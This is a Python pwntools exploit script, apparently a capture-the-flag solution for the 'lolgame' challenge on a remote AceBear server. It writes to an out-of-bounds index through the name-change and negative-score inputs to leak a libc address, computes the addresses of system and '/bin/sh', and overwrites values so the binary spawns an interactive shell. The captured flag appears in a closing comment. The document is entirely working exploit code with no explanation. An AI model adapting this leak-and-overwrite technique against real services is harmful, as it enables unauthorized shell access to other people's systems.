from pwn import *

#r = process("./lol")
r = remote("lolgame.acebear.site", 3004)

def play(point):
	r.sendline("1")
	print r.recvuntil("Point: ")
	r.sendline(str(point))

	for i in range(3):
		print r.recvuntil("row: ")
		r.sendline("0")
		print r.recvuntil("column: ")
		r.sendline(str(i+1))

def changeName(name):
	r.sendline("3")
	print r.recvuntil("name:")
	r.send(name)
	print r.recvuntil("Choice:")

print r.recvuntil("name:")
r.sendline("mathboy7")

print r.recvuntil("Choice:")

changeName("A"*0x10 + chr(58))
play(-100)

print r.recvuntil("Score:")
rv = int(r.recvuntil("\n")[:-1])
libc = 2**32 + rv
libc_base = libc - 0x18276
system = libc_base + 0x3a900
binsh = libc_base + 0x15d00f

print r.recvuntil("Choice:")

print "libc: :" + hex(libc)

changeName("A"*0x10 + chr(57))
play(-system)
changeName("A"*0x10 + chr(59))
play(-binsh)

r.sendline("4")

r.interactive()

# AceBear{tH4_r00t_1s_pr0gr4m_l3u7_u_are_hum4n}